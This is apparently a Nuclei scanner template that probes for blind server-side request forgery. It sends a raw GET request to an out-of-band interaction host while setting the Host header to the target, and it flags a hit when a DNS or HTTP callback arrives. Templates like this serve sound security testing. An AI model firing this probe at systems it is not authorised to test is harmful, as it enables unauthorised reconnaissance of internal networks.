http:
- matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  raw:
  - 'GET https://{{interactsh-url}}/ HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: no-transform

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
  unsafe: true
id: simple-ssrf
info:
  author: reewardius
  description: https://www.argosdns.io/blog/how-i-got-into-starbucks-internal-network-using-a-non-resolvable-hostnames
  name: Blind SSRF
  severity: high
  tags: ssrf,blind,oob
